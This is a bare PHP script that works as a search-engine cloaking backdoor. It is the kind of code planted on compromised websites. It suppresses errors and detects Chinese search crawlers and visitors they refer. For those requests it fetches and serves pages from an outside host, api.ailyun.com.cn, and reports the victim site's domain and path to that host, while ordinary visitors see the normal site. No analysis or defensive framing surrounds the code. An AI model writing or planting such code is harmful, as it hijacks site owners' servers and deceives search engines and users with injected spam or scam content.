<?php
	header("Content-Type: text/html;charset=utf-8");
	set_time_limit(0);
	error_reporting(0);
	define('WdnmdServer','http://api.ailyun.com.cn/app.php');
	define('Stri','stristr');
	$Server = $_SERVER;
	define('Url',$Server['REQUEST_URI']);
	define('Ref',$Server['HTTP_REFERER']);
	define('Ua',$Server['HTTP_USER_AGENT']);
	define('Road','?domain='. base64_encode($Server['HTTP_HOST']) .'&path='.$Server['REQUEST_URI'].Spider());
	define('Regs','@Baidu|Sogou|Yisou|Soso|Haosou|360Spider|So.com|Sm.cn@i');
	define('Area',stristr(Url,".xml")or stristr(Url,".doc")or stristr(Url,".txt")or stristr(Url,".ppt")or stristr(Url,".xls")or stristr(Url,".csv")or stristr(Url,".shtml")or stristr(Url,".pdf")or stristr(Url,".docx")or stristr(Url,".xlsx")and stristr(Url,"?"));
	
	if(Area&&preg_match(Regs,Ref)) {
		$Content = Doget(WdnmdServer. '?domain='. base64_encode($Server["HTTP_HOST"]) . '&path='. $Server['PHP_SELF'].'?'.$Server['QUERY_STRING'].'&spider='.urlencode($Server["HTTP_USER_AGENT"]).'&referer='.urlencode($Server['HTTP_REFERER']));
		exit($Content);
	}
	
	if(preg_match(Regs,Ua)) {
		if(Area) {
			$html =  Doget(WdnmdServer . Road);
			exit($html);
		} else {
			echo Get('http://img.ailyun.com.cn/');
			ob_flush();
			flush();
		}
	}
	function Doget($url){
		$curl = curl_init();
			curl_setopt($curl, CURLOPT_URL, $url);
			curl_setopt($curl, CURLOPT_HEADER, 0);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
			$data = curl_exec($curl);
			curl_close($curl);
			return $data;
	}
	
	function Get($url) {
		$e=array('http'=>array('method'=>"GET",'user_agent'=>'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'));
		$i=stream_context_create($e);
		$j=file_get_contents($url,false,$i);
		if(!empty($j)) {
			return $j;
		}
	}
	
	function Spider(){
		$Ua = $_SERVER["HTTP_USER_AGENT"];
		if (preg_match("/.*(baid|aid).*/i", $Ua)) $Ua = "Baidu";
		if (preg_match("/.*(ao|so.com|360).*/i", $Ua)) $Ua = "360";
		if (preg_match("/.*(sogou|sogou|sogo).*/i", $Ua)) $Ua =  "Sougou";
		if (preg_match("/.*(YisouSpider).*/i", $Ua)) $Ua =  "Shenma";		
		switch($Ua){
			case "Baidu":
				return "&spider=BaiduSpider";
				break;
			case "360":
				return "&spider=360Spider";
				break;
			case "Sougou":
				return "&spider=SogouSpider";
				break;
			case "Shenma":
				return "&spider=YisouSpider";
				break;
			default:
				return "";
				break;
		}
	}